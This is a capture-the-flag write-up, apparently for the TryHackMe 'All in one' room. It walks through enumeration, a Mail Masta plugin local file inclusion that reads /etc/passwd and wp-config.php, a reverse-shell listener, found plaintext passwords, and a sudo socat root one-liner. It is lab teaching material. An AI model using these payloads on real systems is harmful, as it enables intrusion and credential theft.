---
title: "All in one"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src="aio.png" width=200 alt="all-in-one">

I like the concept of this machine alot. many ways to exploit

Like sometimes it do be like that IRL

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.226.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLcG2O5LS7paG07xeOB/4E66h0/DIMR/keWMhbTxlA2cfzaDhYknqxCDdYBc9V3+K7iwduXT9jTFTX0C3NIKsVVYcsLxz6eFX3kUyZjnzxxaURPekEQ0BejITQuJRUz9hghT8IjAnQSTPeA+qBIB7AB+bCD39dgyta5laQcrlo0vebY70Y7FMODJlx4YGgnLce6j+PQjE8dz4oiDmrmBd/BBa9FxLj1bGobjB4CX323sEaXLj9XWkSKbc/49zGX7rhLWcUcy23gHwEHVfPdjkCGPr6oiYj5u6OamBuV/A6hFamq27+hQNh8GgiXSgdgGn/8IZFHZQrnh14WmO8xXW5
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Ww9ui4NQDHA5l+lumRpLsAXHYNk4lkghej9obWBlOwnV+tIDw4mgmuO1C3U/WXRgn0GrESAnMpi1DSxy8t1k=
|   256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOG6ExdDNH+xAyzd4w1G4E9sCfiiooQhmebQX6nIcH/

80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
hmm...Expected more open ports

## Gobuster

```
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 276]
/wordpress            (Status: 301) [Size: 314] [--> http://10.10.148.7/wordpress/]


```

ah yes the ftp folder is empty!


```
└──╼ $ftp 10.10.148.7
Connected to 10.10.148.7.
220 (vsFTPd 3.0.3)
Name (10.10.148.7:nair0lf32): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,10,148,7,179,114)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -al
227 Entering Passive Mode (10,10,148,7,112,170)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp> 
```
Let's check that "wordpress" first


```
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.148.7/wordpress/]
/wp-admin             (Status: 301) [Size: 323] [--> http://10.10.148.7/wordpress/wp-admin/]
/wp-content           (Status: 301) [Size: 325] [--> http://10.10.148.7/wordpress/wp-content/]
/wp-includes          (Status: 301) [Size: 326] [--> http://10.10.148.7/wordpress/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]
```

Yeah I will just use wpscan to win some time

```
...

[+] Upload directory has listing enabled: http://10.10.148.7/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.148.7/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.148.7/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.148.7/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>


[i] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.148.7/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://10.10.148.7/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.148.7/wordpress/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.148.7/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.10.148.7/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.148.7/wordpress/wp-content/plugins/reflex-gallery/readme.txt


 ...

```
Yeah he user is not a problem you could clearly see it is the author of the blog posts

Even trying to bruteforce the password did not help me

But we got 2 plugins and wordpress is famous for its plugins security policy

```
└──╼ $searchsploit mail masta

 Exploit                                       Title        |  Path
--------------------------------------------------------------------------------
WordPress Plugin Mail Masta 1.0 - Local File Inclusion      | php/webapps/40290.txt
WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)  | php/webapps/50226.py
WordPress Plugin Mail Masta 1.0 - SQL Injection             | php/webapps/41438.txt
--------------------------------------------------------------------------------------------
Shellcodes: No Results

└──╼ $searchsploit reflex-gallery
Exploits: No Results
Shellcodes: No Results
```
Guess what? we gonna exploit mail masta

I chose the LFI way for it is faster



```
http://10.10.230.184/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
LFI is usually for reading those config files for creds

```
http://10.10.230.184/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

...

```

If you tried to ssh with those I am so sorry

there is more job to do as it seems

Upload a classic reverse shell in theme editor 

or use a plugin...anyway you want, get a shell

```
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 33828
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:53:26 up 24 min,  0 users,  load average: 0.00, 0.04, 0.30
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-4.4$ 

```
Back to business! 

```
bash-4.4$ ls -al
ls -al
total 48
drwxr-xr-x 6 elyana elyana 4096 Oct  7  2020 .
drwxr-xr-x 3 root   root   4096 Oct  5  2020 ..
-rw------- 1 elyana elyana 1632 Oct  7  2020 .bash_history
-rw-r--r-- 1 elyana elyana  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elyana elyana 3771 Apr  4  2018 .bashrc
drwx------ 2 elyana elyana 4096 Oct  5  2020 .cache
drwxr-x--- 3 root   root   4096 Oct  5  2020 .config
drwx------ 3 elyana elyana 4096 Oct  5  2020 .gnupg
drwxrwxr-x 3 elyana elyana 4096 Oct  5  2020 .local
-rw-r--r-- 1 elyana elyana  807 Apr  4  2018 .profile
-rw-r--r-- 1 elyana elyana    0 Oct  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 elyana elyana   59 Oct  6  2020 hint.txt
-rw------- 1 elyana elyana   61 Oct  6  2020 user.txt

bash-4.4$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
bash-4.4$ cat hint.txt
cat hint.txt
Elyana's user password is hidden in the system. Find it ;)

```
nieh!

```
bash-4.4$ find / -user elyana 2>/dev/null
find / -user elyana 2>/dev/null
/home/elyana
/home/elyana/.local
/home/elyana/.local/share
/home/elyana/.cache
/home/elyana/user.txt
/home/elyana/.gnupg
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt

bash-4.4$ cat /etc/mysql/conf.d/private.txt             
cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght

```

ah yes I love using find...its my favorite command

that was an extra step but hey now we got ssh too

```
su elyana
Password: E@syR18ght

bash-4.4$ cd /home/elyana
cd /home/elyana
bash-4.4$ cat user.txt
cat user.txt
aGFoYSBiYXppbmdhISB5b3UgZ290IHRyaWNrZWQh

```

Decode the flag to get it to the right format

## Privilege Escalation

The classics

```
bash-4.4$ sudo -l
sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat

```
```
bash-4.4$ find / -perm -u=s 2>/dev/null
find / -perm -u=s 2>/dev/null
/bin/mount
/bin/ping
/bin/fusermount
/bin/su
/bin/bash
/bin/chmod
/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/lxc
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/socat
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/passwd
```
socat acting very sus right now

But look there is also pkexec/lxc

```
bash-4.4$ id
id
uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
```
yup I see at least two ways

I already did the lxd method...like twice so I wont bother this time

you should try its very fun (use alpine-builder for the image)

I ask gtfobins how to make socat behave 

you would not believe how easy the answer was

```
bash-4.4$ sudo socat stdin exec:/bin/sh
sudo socat stdin exec:/bin/sh
id
id
uid=0(root) gid=0(root) groups=0(root)
```
One-line superpowers

Get the stuff

```
cd /root
ls
cd /root
ls
root.txt
cat root.txt 
cat root.txt
YW5vdGhlciBmYWtlIGZsYWcgZm9yIGZvb2xz

```
Decode the flag and its done

I have to admit I feel a bit disappointed...I expected "many ways to exploit"

But it still felt very linear...Still a nice room

But I expected many cheese holes

It was more like 2 or 3 ways to escalate and get root

Maybe its me just being stupid and not finding other ways

I will explore it a bit more later (or just read writeups to see how others did it)

Overall a nice easy room!

